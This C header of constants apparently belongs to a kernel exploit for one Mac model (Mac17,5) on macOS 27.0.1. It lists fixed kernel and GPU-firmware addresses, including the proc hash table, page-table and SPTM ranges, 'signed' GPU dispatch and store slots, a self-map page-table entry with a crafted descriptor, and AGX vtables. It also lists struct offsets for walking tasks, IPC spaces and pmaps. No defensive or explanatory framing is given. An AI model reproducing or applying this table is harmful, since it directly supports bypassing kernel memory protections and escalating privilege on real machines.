#ifndef OFFSETS_H
#define OFFSETS_H

/* Mac17,5-only follow-on probes, macOS 27.0.1 (26A434). */
#define PROC_HASH_TABLE            0xfffffe000c829bb8ULL
#define IOMACHPORT_VTABLE          0xfffffe0007e83ad8ULL
#define AGX_USERCLIENT_VTABLE      0xfffffe0007ed6310ULL
#define DROP_OFFSET_COMMAND        0xfffffe0008a50930ULL
#define VM_PAGES_FIRST_PNUM        0xfffffe0007e2c000ULL
#define VM_PAGES_END               0xfffffe0007e2c008ULL
#define VM_PAGES_BEGIN             0xfffffe0007e2c010ULL
#define CPU_TTEP                   0xfffffe0007da06d8ULL
#define PAPT_COUNT                 0xfffffe0007ec0240ULL
#define PAPT_RANGES                0xfffffe0007ec0248ULL
#define SPTM_FIRST_PHYS            0xfffffe0007ec0250ULL
#define SPTM_LAST_PHYS             0xfffffe0007ec0258ULL
#define SPTM_FRAME_TABLE           0xfffffe0007ec0278ULL
#define KERNEL_RO_PROBE            0xfffffe00070147c0ULL
#define KERNELCACHE_STATIC_BASE    0xfffffe0006ffc000ULL
#define BOOTKC_RO_RANGE            0xfffffe000c8183f8ULL
#define BOOTKC_RANGE_COUNT         0xfffffe000c818448ULL

#define GFX_SCRATCH                0xfffffc00000fbcf0ULL
#define GFX_SAMPLER_SP             0xfffffc00000f84a0ULL
#define GFX_SAMPLER_X20            0xfffffc00000f8448ULL
#define GFX_SAMPLER_SP_ORIGINAL    0xfffffc00000f8270ULL

#define GFX_SCHEDULER_CORE         0xfffffc000006f180ULL
#define GFX_SCHEDULER_EVENT0       0xfffffc00000fbb78ULL
#define GFX_SCHEDULER_NOTIFY       0xfffffc00000fbc20ULL
#define GFX_SIGNED_DISPATCH_SLOT   0xfffffc000008c070ULL
#define GFX_SIGNED_PAIR_STORE_SLOT 0xfffffc000008c150ULL
#define GFX_SIGNED_RET_SLOT        0xfffffc000008c348ULL
#define GFX_SIGNED_STORE32_SLOT    0xfffffc000008c358ULL
#define GFX_SIGNED_RECORD_BUILDER_SLOT 0xfffffc00000fb4f0ULL
#define GFX_AUTH_OBJECT            0xfffffc0000112800ULL
#define GFX_READ_SOURCE_A          (GFX_AUTH_OBJECT + 0x100ULL)
#define GFX_READ_SOURCE_B          (GFX_AUTH_OBJECT + 0x200ULL)
#define GFX_CONTEXT_TABLE          0xfffffc000005f7a0ULL
#define GFX_COPYOUT_TABLE          0xfffffc000005b7a0ULL
#define GFX_COPYOUT_STRIDE         0xf0ULL
#define GFX_LEAF_SELF_MAP          0xfffffc0001fc8000ULL
#define GFX_TEST_ALIAS             0xfffffc0000200000ULL
#define GFX_TEST_ALIAS_INDEX       ((GFX_TEST_ALIAS >> 14) & 0x7ffULL)
#define GFX_TEST_ALIAS_PTE         \
    (GFX_LEAF_SELF_MAP + GFX_TEST_ALIAS_INDEX * sizeof(uint64_t))
#define GFX_DATA_PAGE_DESCRIPTOR   0x0460000000000443ULL
#define GFX_MICROPPL_TTBR1_SLOT    0xfffffc00000b00c0ULL

#define AGX_FIRMWARE_VTABLE        0xfffffe0007ed92e8ULL
#define DEVICE_CONTROL_RING_VTABLE 0xfffffe0007ed8340ULL
#define AGX_COMMAND_ROLE_TABLE     0xfffffe000714fa50ULL
#define APPLE_ASCWRAP_V6_INBOX     0xfffffe0008b08a64ULL
#define AGX_RESOURCE_VTABLE        0xfffffe0007ee5af8ULL
#define AGX_SECURE_MAP_VTABLE      0xfffffe0007ee6088ULL

#define PROC_RO                    0x18ULL
#define PROC_PID                   0x60ULL
#define PROC_HASH_LINK             0xa0ULL
#define PROC_RO_TASK               0x08ULL
#define TASK_IPC_SPACE             0x318ULL
#define TASK_VM_MAP                0x28ULL
#define VM_MAP_PMAP                0x58ULL
#define PMAP_TTE                   0x00ULL
#define PMAP_TTEP                  0x08ULL
#define IPC_SPACE_TABLE            0x48ULL
#define IPC_SPACE_TASK             0x50ULL
#define IPC_ENTRY_SIZE             0x18ULL
#define IPC_PORT_BITS              0x00ULL
#define IPC_PORT_KOBJECT           0x50ULL
#define IOMACHPORT_OBJECT          0x20ULL
#define USERCLIENT_DEVICE          0x120ULL
#define DEVICE_IOGPU               0x48ULL
#define DEVICE_NAMESPACE           0x10ULL
#define DEVICE_MACH_TASK           0x50ULL
#define DEVICE_IOGPU_TASK          0x58ULL
#define DEVICE_PID                 0x60ULL
#define DEVICE_MDSID_MAP           0x178ULL
#define DEVICE_SHARED_MACHINE      0x30ULL
#define ACCELERATOR_FIRMWARE_OFFSET 0x598ULL

#define DSIDS_SUPPORTED            68124ULL
#define COMMAND_ARGUMENT_SIZE      680ULL
#define NEW_QUEUE_ARGUMENT_SIZE    696ULL
#define DROP_STATE                 80288ULL
#define DROP_COUNTER               104968ULL
#define DROP_GPU_OFFSET            1424ULL
#define DROP_OWNER                 107912ULL
#define IOGPU_GPU_TASK             0xd0ULL
#define SHARED_MACHINE_GPU_TASK    0x38ULL
#define OWNER_BUFFER               80ULL
#define MAP_GPU_BASE               40ULL
#define MAP_TASK                   32ULL
#define MAP_NEXT                   56ULL
#define IOGPU_TASK_MAP_LIST        0x1b8ULL

#define NAMESPACE_OBJECT_ARRAY     0x10ULL
#define NAMESPACE_CAPACITY         0x28ULL
#define NAMESPACE_COUNT            0x30ULL
#define NAMESPACE_MAX_CAPACITY     16384U
#define RESOURCE_MAP               0x20ULL
#define RESOURCE_MEMORY            0x28ULL
#define RESOURCE_OFFSET            0x48ULL
#define RESOURCE_LENGTH            0x78ULL
#define RESOURCE_NAMESPACE_ID      0x88ULL

#define SYSMEM_IOMD                0x90ULL
#define IOMD_FLAGS                 0x20ULL
#define IOMD_LENGTH                0x50ULL
#define IOMD_RANGES                0x60ULL
#define IOMD_RANGE_COUNT           0x68ULL
#define IOMD_WIRE_COUNT            0x88ULL
#define IOMD_MEMORY_ENTRIES        0x90ULL
#define IOMD_PAGE_COUNT            0x98ULL
#define IOBMD_BUFFER               0xb8ULL

#define FIRMWARE_DEVICE_RING_BASE  0xab8ULL
#define FIRMWARE_DEVICE_RING_STRIDE 0x130ULL
#define FIRMWARE_CHANNEL_BASE      0x1980ULL
#define FIRMWARE_CHANNEL_STRIDE    0x38ULL
#define CHANNEL_ENDPOINT           0x130ULL
#define ENDPOINT_ACTIVE            0x28ULL
#define ENDPOINT_TRANSPORT         0x48ULL
#define ENDPOINT_ID                0x88ULL
#define TRANSPORT_MAILBOX          0xb0ULL
#define MAILBOX_POST_METHOD        0x9a0ULL
#define ASCWRAP_INBOX_BASE         0x100ULL
#define ASCWRAP_INBOX_OFFSET       0x8800ULL
#define RING_INDEX_BLOCK           0x08ULL
#define RING_BUFFER                0x18ULL
#define RING_READ_INDEX            0x00ULL
#define RING_WRITE_INDEX           0x20ULL
#define DEVICE_CONTROL_ENTRY_SIZE  0x40ULL
#define DEVICE_CONTROL_ENTRY_COUNT 0x100U

#endif
